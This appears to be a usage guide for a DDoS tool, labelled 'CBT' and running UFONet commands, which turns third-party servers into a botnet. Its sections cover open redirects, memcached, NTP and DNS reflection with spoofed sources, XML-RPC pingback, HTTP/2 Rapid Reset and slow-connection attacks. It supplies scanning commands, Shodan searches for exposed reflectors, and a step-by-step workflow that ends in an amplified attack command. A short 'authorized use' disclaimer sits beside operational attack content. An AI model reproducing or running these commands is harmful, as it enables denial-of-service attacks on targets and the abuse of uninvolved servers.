# Interacting with Vulnerable Systems - CBT Guide

## Overview

This guide explains how CBT interacts with vulnerable servers and systems for authorized security testing.

## Botnet Types and Their Interactions

### 1. HTTP Redirectors (Zombies, Droids, Aliens, UCAVs)

**How it works:**
- CBT exploits Open Redirect vulnerabilities (CWE-601)
- Vulnerable servers redirect requests to target
- Target receives traffic from vulnerable server's IP

**Finding vulnerable servers:**
```bash
# Search for Open Redirect vulnerabilities
./ufonet -s 'page.php?url='
./ufonet --sd botnet/dorks.txt --sa
```

**Interaction pattern:**
1. CBT sends: `http://vulnerable-server.com/redirect.php?url=http://target.com`
2. Vulnerable server redirects to target
3. Target sees request from vulnerable server

### 2. Amplification Reflectors (Memcached, SSDP, Chargen, NTP, DNS, SNMP, CoAP)

**How it works:**
- CBT sends small requests to vulnerable reflectors
- Reflectors respond with large responses to target
- Amplification factor: 10x to 50,000x

**Finding vulnerable reflectors:**
```bash
# Automated scanning
./ufonet --scan-memcached 192.168.1.0-192.168.1.255
./ufonet --scan-ssdp 10.0.0.0-10.0.0.255
./ufonet --scan-all <IP_RANGE>
```

**Interaction pattern:**
1. CBT sends small UDP packet to reflector (spoofed source = target)
2. Reflector sends large response to target
3. Target overwhelmed by amplified traffic

### 3. XML-RPC Pingback (X-RPCs)

**How it works:**
- Exploits WordPress/XML-RPC pingback vulnerability
- Vulnerable server makes request to target
- Creates callback loop increasing load

**Finding vulnerable servers:**
```bash
./ufonet --test-rpc
```

**Interaction pattern:**
1. CBT sends pingback request to vulnerable WordPress site
2. WordPress site requests target URL
3. Creates amplification effect

### 4. HTTP/2 Vulnerabilities (HTTP2s)

**How it works:**
- Exploits HTTP/2 Rapid Reset (CVE-2023-44487)
- Exploits HTTP/2 Zero Window vulnerabilities
- Bypasses connection limits

**Finding vulnerable servers:**
```bash
./ufonet --scan-http2 domains.txt
```

**Interaction pattern:**
1. CBT opens HTTP/2 connection
2. Rapidly opens and resets streams
3. Server resources exhausted

### 5. Slow Attacks (RUDY, LORIS)

**How it works:**
- Opens connections and keeps them open
- Sends data very slowly
- Exhausts connection pool

**Finding vulnerable servers:**
```bash
./ufonet --test-rudy http://target.com
```

**Interaction pattern:**
1. CBT opens connection to target
2. Sends headers/body very slowly
3. Server keeps connection open waiting
4. Connection pool exhausted

## Automated Discovery

### Scanner Module

CBT includes automated scanning for vulnerable systems:

```bash
# Scan for all types
./ufonet --scan-all 192.168.1.0-192.168.1.255

# Scan specific type
./ufonet --scan-memcached <IP_RANGE>
./ufonet --scan-ssdp <IP_RANGE>
./ufonet --scan-chargen <IP_RANGE>
./ufonet --scan-ntp <IP_RANGE>
./ufonet --scan-dns <IP_RANGE>
./ufonet --scan-snmp <IP_RANGE>
./ufonet --scan-coap <IP_RANGE>
```

### Shodan Integration (Optional)

```bash
# Search Shodan for vulnerable servers
./ufonet --shodan-search "product:memcached"
./ufonet --shodan-search "port:11211"
```

## Safety and Ethics

⚠️ **IMPORTANT**: Only use CBT on systems you own or have explicit written authorization to test.

1. **Authorization Required**: Always get written permission before testing
2. **Scope Limitation**: Only test systems within authorized scope
3. **Rate Limiting**: Use reasonable rates to avoid causing harm
4. **Responsible Disclosure**: Report vulnerabilities responsibly
5. **Legal Compliance**: Ensure compliance with local laws

## Best Practices

1. **Start Small**: Begin with low-intensity tests
2. **Monitor Impact**: Watch target system health
3. **Document Everything**: Keep logs of all activities
4. **Use Test Environment**: Prefer isolated test environments
5. **Respect Rate Limits**: Don't overwhelm systems

## Example Workflow

```bash
# 1. Discover vulnerable systems
./ufonet --scan-all 192.168.1.0-192.168.1.255

# 2. Test discovered systems
./ufonet -t botnet/memcacheds.txt

# 3. Verify they're still vulnerable
./ufonet --test-all

# 4. Use in authorized attack
./ufonet -a http://authorized-target.com -r 10 --memcached 100
```

## Integration with Other Tools

CBT can integrate with:
- **Nmap**: For port scanning
- **Shodan**: For vulnerability discovery
- **Censys**: For internet-wide scanning
- **Masscan**: For fast port scanning

```bash
# Export results for other tools
./ufonet --export-nmap botnet/memcacheds.txt
./ufonet --export-json results.json
```
